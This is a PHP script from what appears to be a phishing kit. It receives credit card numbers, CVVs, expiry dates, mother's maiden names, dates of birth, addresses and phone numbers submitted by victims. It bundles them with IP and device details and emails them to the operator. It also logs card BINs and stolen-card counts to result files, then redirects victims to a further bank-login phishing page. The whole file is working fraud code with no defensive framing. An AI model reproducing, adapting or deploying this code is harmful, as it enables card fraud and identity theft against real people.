<?php
error_reporting(0);
require_once '../../main.php';
$type = $_SESSION['type'] = strtoupper($bin["type"]);
$brand = $_SESSION['brand'] = strtoupper($bin["brand"]);
$bank = $_SESSION['bank'] = strtoupper($bin["bank"]["name"]);
$fullname = $_POST['holder'];
$bin = check_bin($_POST['cc']);
$bins = preg_replace('/\s/', '', $_POST['cc']);
$bins = substr($bins,0,6);

$cc = preg_replace('/\s/', '', $_POST['cc']);
$ispuser = getisp($ip);
$message .= "#-----------------------[ G-SPOT. Inc ]--------------------#\n";
$message .= "#----------------------[ Credit Card ]---------------------#\n";
$message .= "Bank 		 : ".$bin["bank"]["name"]."\n";
$message .= "Type 		 : ".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."\n";
$message .= "CardHolder  : ".$_POST['holder']."\n";
$message .= "CC Number	 : ".$cc."\n";
$message .= "Exp         : ".$_POST['month']."/".$_POST['year']."\n";
$message .= "Cvv         : ".$_POST['cvv']."\n";
$message .= "Mother's Maiden Name         : ".$_POST['mmn']."\n";
$message .= "Check       : ".$cc."|".$_POST['month']."|".$_POST['year']."|".$_POST['cvv']."\n";
$message .= "#------------------[ Billing Information ]----------------#\n";
$message .= "Full Name   : ".$_POST['fname']."\n";
$message .= "Address     : ".$_POST['address']."\n";
$message .= "State		 : ".$_POST['state']."\n";
$message .= "Zip    	 : ".$_POST['zip']."\n";
$message .= "Dob		 : ".$_POST['dob']."\n";
$message .= "Phone		 : ".$_POST['phone']."\n";
$message .= "#-----------------[ DEVICE INFORMATION ]-----------------#\n";
$message .= "IP Address  : ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		: ".$regionuser."\n";
$message .= "City		: ".$cityuser."\n";
$message .= "GMT         : ".$continent."\n";
$message .= "Timezone	 : ".$timezone."\n";
$message .= "Os&Browser	 : ".$os." / ".$br."\n";
$message .= "Date		 : ".$date."\n";
$message .= "User Agent	 : ".$user_agent."\n";
$message .= "#----------------------[ きみ の こと が すき だから ]---------------------#\n";

$bins = preg_replace('/\s/', '', $_POST['cc']);
$bins = substr($bins,0,6);

if($bin["brand"] == "") {
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." - [ ".$cn." - ".$os." - ".$ip." ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
}else{
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." - [ ".$cn." - ".$os." - ".$ip." ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}

$from = $senderemail;
$headers = "From: $fullname <$from>";
mail($email, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r")); 

tulis_file("../../result/total_bin.txt","$subbin|$countrycode|$cn|$os\n");

$file = "../../result/total_cc.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);


if($setting['with_bank'] == "YEPS"){
 echo "<script type='text/javascript'>window.top.location='../bank/?account=$key';</script>";
}else{
echo "<script type='text/javascript'>window.top.location='../complete';</script>";
}